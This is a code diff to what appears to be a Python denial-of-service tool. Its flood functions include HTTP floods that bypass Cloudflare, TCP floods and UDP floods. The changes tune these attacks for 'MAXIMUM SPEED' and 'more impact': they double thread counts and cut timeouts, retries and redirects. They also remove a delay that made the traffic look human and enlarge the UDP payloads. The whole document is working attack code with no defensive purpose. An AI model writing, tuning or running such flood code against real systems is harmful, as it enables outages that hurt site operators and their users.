@@ -134,26 +134,26 @@ class CloudflareBypassEngine:
     
     # ============= CLOUDFLARE BYPASS HTTP FLOOD =============
     
-    def cloudflare_bypass_flood(self, target, duration, method='GET', threads=500):
-        """Advanced HTTP flood with Cloudflare bypass"""
+    def cloudflare_bypass_flood(self, target, duration, method='GET', threads=1000):
+        """Advanced HTTP flood with Cloudflare bypass - MAXIMUM SPEED"""
         print(f"[L7] Starting CLOUDFLARE BYPASS {method} flood on {target}")
         self.running = True
         
-        # Reduce pool count to avoid file descriptor issues
-        pool_count = 10  # Changed from 50
+        # Increase pool count for more throughput
+        pool_count = 20  # Increased from 10
         for _ in range(pool_count):
             pool = urllib3.PoolManager(
-                maxsize=100,  # Reduced from 1000
+                maxsize=200,  # Increased from 100
                 retries=urllib3.Retry(
-                    total=2,  # Reduced from 3
-                    backoff_factor=0.2,
+                    total=1,  # Reduced retries for speed
+                    backoff_factor=0.1,
                     status_forcelist=[429, 500, 502, 503, 504],
                     raise_on_status=False
                 ),
-                timeout=urllib3.Timeout(connect=3, read=5),  # Reduced timeouts
+                timeout=urllib3.Timeout(connect=2, read=3),  # Faster timeouts
                 cert_reqs='CERT_NONE',
                 assert_hostname=False,
-                num_pools=10,  # Reduced from 100
+                num_pools=20,  # Increased from 10
                 block=False
             )
             self.pools.append(pool)
@@ -212,13 +212,13 @@ class CloudflareBypassEngine:
                     cookie_str = '; '.join(f'{k}={v}' for k, v in session_cookies.items())
                     headers['Cookie'] = cookie_str
                     
-                    # Prepare request
+                    # Prepare request with reduced timeouts for speed
                     kwargs = {
                         'headers': headers,
-                        'timeout': urllib3.Timeout(connect=4, read=8),
-                        'retries': urllib3.Retry(3),
+                        'timeout': urllib3.Timeout(connect=2, read=3),
+                        'retries': False,  # No retries for max speed
                         'preload_content': False,
-                        'redirect': True
+                        'redirect': False  # No redirects for speed
                     }
                     
                     if method == 'POST':
@@ -262,8 +262,8 @@ class CloudflareBypassEngine:
                     
                     request_count += 1
                     
-                    # Small delay to appear more human
-                    time.sleep(random.uniform(0.001, 0.005))
+                    # Remove delay for maximum speed
+                    # time.sleep(random.uniform(0.001, 0.005))
                     
                 except OSError as e:
                     # Handle file descriptor exhaustion gracefully
@@ -301,8 +301,8 @@ class CloudflareBypassEngine:
     
     # ============= TCP ATTACKS =============
     
-    def tcp_power_flood(self, target, duration, threads=200):
-        """Powerful TCP SYN flood"""
+    def tcp_power_flood(self, target, duration, threads=400):
+        """Powerful TCP SYN flood - MAXIMUM SPEED"""
         print(f"[L4] Starting POWERFUL TCP flood on {target}")
         self.running = True
         
@@ -316,7 +316,7 @@ class CloudflareBypassEngine:
             while self.running and time.time() - start_time < duration:
                 try:
                     s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-                    s.settimeout(0.5)
+                    s.settimeout(0.3)  # Faster timeout
                     s.connect((host, port))
                     
                     # Send realistic HTTP-like data
@@ -347,8 +347,8 @@ class CloudflareBypassEngine:
     
     # ============= UDP ATTACKS =============
     
-    def udp_power_flood(self, target, duration, threads=100):
-        """Powerful UDP flood"""
+    def udp_power_flood(self, target, duration, threads=200):
+        """Powerful UDP flood - MAXIMUM SPEED"""
         print(f"[L4] Starting POWERFUL UDP flood on {target}")
         self.running = True
         
@@ -358,8 +358,8 @@ class CloudflareBypassEngine:
         
         start_time = time.time()
         
-        # Pre-generate payloads
-        payloads = [os.urandom(size) for size in [256, 512, 1024, 2048, 4096, 8192, 16384, 32768, 65507]]
+        # Pre-generate larger payloads for more impact
+        payloads = [os.urandom(size) for size in [512, 1024, 2048, 4096, 8192, 16384, 32768, 65507]]
         
         def worker():
             sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
@@ -558,17 +558,17 @@ class Layer7Client:
         # Calculate thread count based on CPU
         cpu_count = psutil.cpu_count()
         
-        # Set aggressive thread counts
+        # Set aggressive thread counts for maximum RPS
         thread_counts = {
-            'http': min(cpu_count * 100, 500),
-            'get': min(cpu_count * 100, 500),
-            'post': min(cpu_count * 100, 500),
-            'tcp': min(cpu_count * 50, 200),
-            'udp': min(cpu_count * 25, 100),
-            'icmp': min(cpu_count * 10, 50),
-            'ping': min(cpu_count * 10, 50)
+            'http': min(cpu_count * 200, 1000),  # Increased multiplier
+            'get': min(cpu_count * 200, 1000),
+            'post': min(cpu_count * 200, 1000),
+            'tcp': min(cpu_count * 100, 400),
+            'udp': min(cpu_count * 50, 200),
+            'icmp': min(cpu_count * 20, 100),
+            'ping': min(cpu_count * 20, 100)
         }
-        threads = thread_counts.get(method, 500)
+        threads = thread_counts.get(method, 1000)
         
         try:
             print(f"\n{'='*60}")
